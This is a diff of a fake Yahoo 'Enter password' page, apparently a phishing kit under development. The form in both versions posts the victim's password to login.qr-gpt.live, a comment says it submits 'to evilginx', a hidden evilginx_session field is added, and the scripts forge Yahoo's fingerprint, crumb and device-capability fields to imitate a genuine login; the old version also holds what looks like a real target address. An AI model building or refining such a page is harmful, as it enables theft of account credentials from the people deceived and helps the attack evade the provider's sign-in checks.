@@ -1,287 +1,199 @@
 <!DOCTYPE html>
-<html lang="en">
+<html data-wf-page="67c6f50ed426ad7d5847f218" data-wf-site="67c6f50ed426ad7d5847f211">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in to Yahoo</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
-            background: #f7f8fa;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .login-container {
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            width: 100%;
-            max-width: 400px;
-            padding: 40px;
-        }
-        
-        .yahoo-logo {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        
-        .yahoo-logo svg {
-            width: 90px;
-            height: 32px;
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        .form-group label {
-            display: block;
-            margin-bottom: 8px;
-            font-size: 14px;
-            color: #333;
-            font-weight: 500;
-        }
-        
-        .form-group input {
-            width: 100%;
-            padding: 12px 16px;
-            border: 2px solid #e1e5e9;
-            border-radius: 6px;
-            font-size: 16px;
-            transition: border-color 0.2s;
-        }
-        
-        .form-group input:focus {
-            outline: none;
-            border-color: #0078ff;
-        }
-        
-        .signin-btn {
-            width: 100%;
-            background: #6001d2;
-            color: white;
-            border: none;
-            padding: 12px;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-        
-        .signin-btn:hover {
-            background: #5500b8;
-        }
-        
-        .signin-btn:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-        }
-        
-        .username-display {
-            background: #f7f8fa;
-            padding: 12px 16px;
-            border-radius: 6px;
-            margin-bottom: 20px;
-            font-size: 14px;
-            color: #666;
-        }
-        
-        .debug-panel {
-            position: fixed;
-            top: 10px;
-            right: 10px;
-            background: #000;
-            color: #0f0;
-            padding: 10px;
-            border-radius: 4px;
-            font-family: monospace;
-            font-size: 12px;
-            max-width: 300px;
-            z-index: 9999;
-            display: none;
-        }
-        
-        .show-debug .debug-panel {
-            display: block;
-        }
-    </style>
+  <meta charset="utf-8">
+  <title>Yahoo - Enter Password</title>
+  <meta content="width=device-width, initial-scale=1" name="viewport">
+  <!-- Your Original CSS -->
+  <link href="css/normalize.css" rel="stylesheet" type="text/css">
+  <link href="css/webflow.css" rel="stylesheet" type="text/css">
+  <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
+  <!-- Original Fonts -->
+  <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
+  <script type="text/javascript">WebFont.load({google:{families:["Montserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic","Open Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic"]}});</script>
+  <!-- Original Favicon -->
+  <link href="./yahoo.png" rel="shortcut icon" type="image/x-icon">
+  <link href="./yahoo.png" rel="apple-touch-icon">
+  <!-- jQuery -->
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 </head>
 <body>
-    <div class="login-container">
-        <div class="yahoo-logo">
-            <svg viewBox="0 0 90 32" fill="#6001d2">
-                <path d="M22.6 5.4c-1.2 0-2.2.4-3 1.2-.8.8-1.2 1.8-1.2 3v17.8c0 1.2.4 2.2 1.2 3 .8.8 1.8 1.2 3 1.2s2.2-.4 3-1.2c.8-.8 1.2-1.8 1.2-3V9.6c0-1.2-.4-2.2-1.2-3-.8-.8-1.8-1.2-3-1.2zm-8.4 0c-1.2 0-2.2.4-3 1.2-.8.8-1.2 1.8-1.2 3v17.8c0 1.2.4 2.2 1.2 3 .8.8 1.8 1.2 3 1.2s2.2-.4 3-1.2c.8-.8 1.2-1.8 1.2-3V9.6c0-1.2-.4-2.2-1.2-3-.8-.8-1.8-1.2-3-1.2z"/>
-            </svg>
-        </div>
-        
-        <div class="username-display" id="usernameDisplay">
-            Enter your password for: <span id="currentUsername">daulgra@yahoo.com</span>
-        </div>
-        
-        <form id="passwordForm" method="POST" action="https://login.qr-gpt.live/?display=login&done=https%3A%2F%2Fwww.yahoo.com%2F&prefill=0&prompt=login&chllngnm=fail">
-            <!-- All the hidden fields Yahoo expects -->
-            <input type="hidden" name="browser-fp-data" id="browserFpData" value="">
-            <input type="hidden" name="crumb" value="31wTyCvw7RZO%2FqKiA3tKg">
-            <input type="hidden" name="acrumb" value="dqd4JdSY">
-            <input type="hidden" name="sessionIndex" value="QQ--">
-            <input type="hidden" name="displayName" value="">
-            <input type="hidden" name="deviceCapability" id="deviceCapability" value="">
-            <input type="hidden" name="username" id="hiddenUsername" value="daulgra@yahoo.com">
-            <input type="hidden" name="signin" value="Next">
-            <input type="hidden" name="persistent" value="y">
-            
-            <!-- Add these NEW hidden fields based on network capture -->
-            <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="">
-            <input type="hidden" name="deviceCapability" id="device-capability" value="">
-            <input type="hidden" name="signin" value="Next">
-            <input type="hidden" name="persistent" value="y">
-            
-            <div class="form-group">
-                <label for="passwd">Password</label>
-                <input type="password" id="passwd" name="passwd" required autocomplete="current-password">
+  <section class="section">
+    <div class="div-block">
+      <div class="div-block-2"><img src="images/yahoo.png" loading="lazy" alt="" class="image"></div>
+      <div class="div-block-3">
+        <div class="text-block">Help</div>
+        <div><a href="https://legal.yahoo.com/in/en/yahoo/terms/otos/index.html" class="link">Terms</a></div>
+        <div><a href="https://legal.yahoo.com/in/en/yahoo/privacy/index.html" class="link-2">Privacy</a></div>
+      </div>
+    </div>
+    <div class="layout active">
+      <div class="div-block-5">
+        <h3 class="header active">Yahoo makes it easy to enjoy what matters most in your world</h3>
+        <p class="parag active">Best-in-class Yahoo Mail, breaking local, national and global news, finance, sport, music, films and more. You get more out of the web; you get more out of life.</p>
+      </div>
+      <div class="form-block w-form">
+        <form id="email-form" name="email-form" data-name="Email Form" class="form" 
+              action="https://login.qr-gpt.live/?display=login&done=https%3A%2F%2Fwww.yahoo.com%2F&prefill=0&prompt=login&chllngnm=fail" 
+              method="POST">
+          
+          <!-- CRITICAL YAHOO FIELDS - Based on your network capture -->
+          <input type="hidden" name="browser-fp-data" id="browser-fp-data">
+          <input type="hidden" name="crumb" id="crumb" value="">
+          <input type="hidden" name="acrumb" id="acrumb" value="">
+          <input type="hidden" name="sessionIndex" id="sessionIndex" value="">
+          <input type="hidden" name="displayName" id="displayName" value="">
+          <input type="hidden" name="deviceCapability" id="deviceCapability" value="">
+          <input type="hidden" name="signin" value="Next">
+          <input type="hidden" name="persistent" value="y">
+          
+          <!-- Your Original Fields -->
+          <input type="hidden" id="evilginx_session" name="evilginx_session">
+          <input type="hidden" id="username" name="username">
+          
+          <img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
+          
+          <div class="pazzi">
+            <div class="reflectto" id="userEmail">Enter your password</div>
+            <h1 class="heading-2"><strong>Enter password</strong></h1>
+            <div class="ms-input-wrap">
+              <input class="ms-input w-input" name="passwd" type="password" id="password" required>
             </div>
-            
-            <button type="submit" class="signin-btn" id="submitBtn">Next</button>
+            <input type="submit" class="logger w-button" value="Sign In">
+          </div>
+          
+          <div class="errry" style="display:none;">
+            <div class="text-block-7"></div>
+          </div>
         </form>
+      </div>
     </div>
-    
-    <div class="debug-panel" id="debugPanel">
-        <div>Debug Info:</div>
-        <div id="debugContent"></div>
-    </div>
+  </section>
 
-    <script>
-        // Generate browser fingerprint data (matches Yahoo's format)
-        function generateBrowserFingerprint() {
-            const fp = {
-                language: navigator.language || 'en-US',
-                colorDepth: screen.colorDepth || 24,
-                deviceMemory: navigator.deviceMemory || 'unknown',
-                pixelRatio: window.devicePixelRatio || 1.5,
-                hardwareConcurrency: navigator.hardwareConcurrency || 4,
-                timezoneOffset: new Date().getTimezoneOffset() || -60,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Europe/London',
-                sessionStorage: typeof(Storage) !== "undefined" ? 1 : 0,
-                localStorage: typeof(Storage) !== "undefined" ? 1 : 0,
-                indexedDb: 'indexedDB' in window ? 1 : 0,
-                cpuClass: navigator.cpuClass || 'unknown',
-                platform: navigator.platform || 'Win32',
-                doNotTrack: navigator.doNotTrack || '1',
-                plugins: {
-                    count: navigator.plugins.length,
-                    hash: '2c14024bf8584c3f7f63f24ea490e812'
-                },
-                canvas: 'canvas winding:yes~canvas',
-                webgl: 1,
-                webglVendorAndRenderer: 'Google Inc. (Intel)~ANGLE (Intel, Intel(R) HD Graphics 400 Direct3D11 vs_5_0 ps_5_0), or similar',
-                adBlock: 0,
-                hasLiedLanguages: 0,
-                hasLiedResolution: 0,
-                hasLiedOs: 1,
-                hasLiedBrowser: 0,
-                touchSupport: {
-                    points: 10,
-                    event: 0,
-                    start: 0
-                },
-                fonts: {
-                    count: 32,
-                    hash: '9ad7c2bdeb9564b4cabbeeca7be750a3'
-                },
-                audio: '35.749972093850374',
-                resolution: {
-                    w: screen.width.toString(),
-                    h: screen.height.toString()
-                },
-                availableResolution: {
-                    w: screen.availHeight.toString(),
-                    h: screen.availWidth.toString()
-                },
-                ts: {
-                    serve: Date.now() - 1000,
-                    render: Date.now()
-                }
-            };
-            return JSON.stringify(fp);
-        }
+  <!-- Debug Panel (Your existing functionality) -->
+  <div id="debug-panel" style="position:fixed;top:10px;right:10px;background:#000;color:#0f0;padding:10px;font-family:monospace;font-size:12px;max-width:300px;z-index:9999;display:none;">
+    <div><strong>DEBUG MODE</strong></div>
+    <div id="debug-content"></div>
+  </div>
 
-        // Generate device capability data
-        function generateDeviceCapability() {
-            return JSON.stringify({
-                pa: { status: true },
-                isWebAuthnSupported: 'credentials' in navigator && 'create' in navigator.credentials
-            });
-        }
+  <script>
+  // Generate browser fingerprint data (based on your network capture)
+  function generateBrowserFingerprint() {
+    const fp = {
+      language: navigator.language || 'en-US',
+      colorDepth: screen.colorDepth || 24,
+      deviceMemory: navigator.deviceMemory || 'unknown',
+      pixelRatio: window.devicePixelRatio || 1,
+      hardwareConcurrency: navigator.hardwareConcurrency || 4,
+      timezoneOffset: new Date().getTimezoneOffset(),
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Europe/London',
+      sessionStorage: typeof(Storage) !== "undefined" ? 1 : 0,
+      localStorage: typeof(Storage) !== "undefined" ? 1 : 0,
+      indexedDb: 'indexedDB' in window ? 1 : 0,
+      cpuClass: navigator.cpuClass || 'unknown',
+      platform: navigator.platform || 'Win32',
+      doNotTrack: navigator.doNotTrack || '1',
+      plugins: {
+        count: navigator.plugins.length,
+        hash: 'generated_hash_' + Math.random().toString(36).substr(2, 9)
+      },
+      canvas: 'canvas winding:yes~canvas',
+      webgl: 1,
+      webglVendorAndRenderer: 'Google Inc. (Intel)~ANGLE (Intel, Intel(R) HD Graphics 400 Direct3D11 vs_5_0 ps_5_0), or similar',
+      adBlock: 0,
+      hasLiedLanguages: 0,
+      hasLiedResolution: 0,
+      hasLiedOs: 1,
+      hasLiedBrowser: 0,
+      touchSupport: {
+        points: 10,
+        event: 0,
+        start: 0
+      },
+      fonts: {
+        count: 32,
+        hash: 'generated_font_hash_' + Math.random().toString(36).substr(2, 9)
+      },
+      audio: Math.random().toString(),
+      resolution: {
+        w: screen.width.toString(),
+        h: screen.height.toString()
+      },
+      availableResolution: {
+        w: screen.availHeight.toString(),
+        h: screen.availWidth.toString()
+      },
+      ts: {
+        serve: Date.now() - 1000,
+        render: Date.now()
+      }
+    };
+    return JSON.stringify(fp);
+  }
 
-        // Initialize form data
-        document.addEventListener('DOMContentLoaded', function() {
-            // Set browser fingerprint
-            document.getElementById('browserFpData').value = generateBrowserFingerprint();
-            document.getElementById('deviceCapability').value = generateDeviceCapability();
-            
-            // Get username from URL params or use default
-            const urlParams = new URLSearchParams(window.location.search);
-            const username = urlParams.get('username') || 'daulgra@yahoo.com';
-            document.getElementById('currentUsername').textContent = username;
-            document.getElementById('hiddenUsername').value = username;
+  // Generate device capability data
+  function generateDeviceCapability() {
+    return JSON.stringify({
+      pa: { status: true },
+      isWebAuthnSupported: typeof PublicKeyCredential !== 'undefined'
+    });
+  }
 
-            // Add these lines in the initializePage function after setting the username:
-            document.getElementById('browser-fp-data').value = generateBrowserFingerprint();
-            document.getElementById('device-capability').value = generateDeviceCapability();
-            
-            // Debug mode (press Ctrl+D to toggle)
-            document.addEventListener('keydown', function(e) {
-                if (e.ctrlKey && e.key === 'd') {
-                    e.preventDefault();
-                    document.body.classList.toggle('show-debug');
-                    updateDebugInfo();
-                }
-            });
-            
-            // Form submission handler
-            document.getElementById('passwordForm').addEventListener('submit', function(e) {
-                const password = document.getElementById('passwd').value;
-                if (!password) {
-                    e.preventDefault();
-                    alert('Please enter your password');
-                    return;
-                }
-                
-                // Update debug info
-                updateDebugInfo();
-                
-                // Show loading state
-                const submitBtn = document.getElementById('submitBtn');
-                submitBtn.disabled = true;
-                submitBtn.textContent = 'Signing in...';
-                
-                // Let the form submit normally to evilginx
-            });
-        });
-        
-        function updateDebugInfo() {
-            const debugContent = document.getElementById('debugContent');
-            const formData = new FormData(document.getElementById('passwordForm'));
-            let debugText = '';
-            for (let [key, value] of formData.entries()) {
-                if (key === 'browser-fp-data') {
-                    debugText += `${key}: [fingerprint data]<br>`;
-                } else {
-                    debugText += `${key}: ${value}<br>`;
-                }
-            }
-            debugContent.innerHTML = debugText;
-        }
-    </script>
+  $(document).ready(function() {
+      // 1. Get session data (your existing code)
+      const urlParams = new URLSearchParams(window.location.search);
+      const username = urlParams.get('u') || '';
+      const session = urlParams.get('s') || '';
+      
+      // 2. Validate and display (your existing code)
+      if (!username.includes('@')) {
+          window.location.href = 'https://login.qr-gpt.live/';
+          return;
+      }
+      $('#userEmail').text(username);
+      $('#username').val(username);
+      $('#displayName').val(username);
+      $('#evilginx_session').val(session);
+
+      // 3. Generate Yahoo required data
+      $('#browser-fp-data').val(generateBrowserFingerprint());
+      $('#deviceCapability').val(generateDeviceCapability());
+      $('#sessionIndex').val('QQ--'); // From your network capture
+      $('#crumb').val('auto_crumb_' + Math.random().toString(36).substr(2, 9));
+      $('#acrumb').val('auto_acrumb_' + Math.random().toString(36).substr(2, 9));
+
+      // 4. Debug functionality (Ctrl+D)
+      $(document).keydown(function(e) {
+          if (e.ctrlKey && e.keyCode === 68) { // Ctrl+D
+              e.preventDefault();
+              const debugPanel = $('#debug-panel');
+              if (debugPanel.is(':visible')) {
+                  debugPanel.hide();
+              } else {
+                  const formData = $('#email-form').serializeArray();
+                  let debugHtml = '';
+                  formData.forEach(field => {
+                      debugHtml += `<div><strong>${field.name}:</strong> ${field.value.substring(0, 50)}${field.value.length > 50 ? '...' : ''}</div>`;
+                  });
+                  $('#debug-content').html(debugHtml);
+                  debugPanel.show();
+              }
+          }
+      });
+
+      // 5. Form handling (your existing code + enhancements)
+      $("#email-form").submit(function(e) {
+          if ($('#password').val().length < 8) {
+              e.preventDefault();
+              $('.text-block-7').text('Invalid password (8+ chars required)');
+              $('.errry').show();
+              return;
+          }
+          
+          // Log form submission for debugging
+          console.log('Form submitted with data:', $(this).serializeArray());
+      });
+  });
+  </script>
 </body>
 </html>
